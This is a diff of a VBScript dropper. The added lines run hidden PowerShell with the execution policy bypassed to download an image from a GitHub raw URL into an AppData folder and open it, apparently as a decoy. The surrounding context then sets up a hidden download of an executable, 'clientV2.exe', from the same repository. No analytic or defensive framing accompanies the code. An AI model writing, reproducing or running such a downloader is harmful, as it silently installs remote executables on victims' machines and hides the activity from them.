@@ -31,6 +31,23 @@ InstDir=AppDat & "\service"
 If Not FSObj.FolderExists(InstDir) Then
     FSObj.CreateFolder(InstDir)
 End If
+ImgURL="https://raw.githubusercontent.com/kunalya5185/Files/refs/heads/main/image2.jpeg"
+ImgFile=InstDir & "\image2.jpg"
+PSImgCmd="powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & _
+         "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " & _
+         "try { " & _
+         "$webClient = New-Object System.Net.WebClient; " & _
+         "$webClient.Headers.Add('User-Agent', 'Mozilla/5.0'); " & _
+         "$webClient.DownloadFile('" & ImgURL & "', '" & ImgFile & "') " & _
+         "} catch { " & _
+         "try { " & _
+         "Invoke-WebRequest -Uri '" & ImgURL & "' -OutFile '" & ImgFile & "' -UseBasicParsing -UserAgent 'Mozilla/5.0' " & _
+         "} catch { exit 1 } " & _
+         "}"""
+WShell.Run PSImgCmd,0,True
+If FSObj.FileExists(ImgFile) Then
+    WShell.Run """" & ImgFile & """",1,False
+End If
 DLURL="https://raw.githubusercontent.com/kunalya5185/Files/refs/heads/main/clientV2.exe"
 OutFile=InstDir & "\New_Client2.exe"
 PSCmd="powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & _
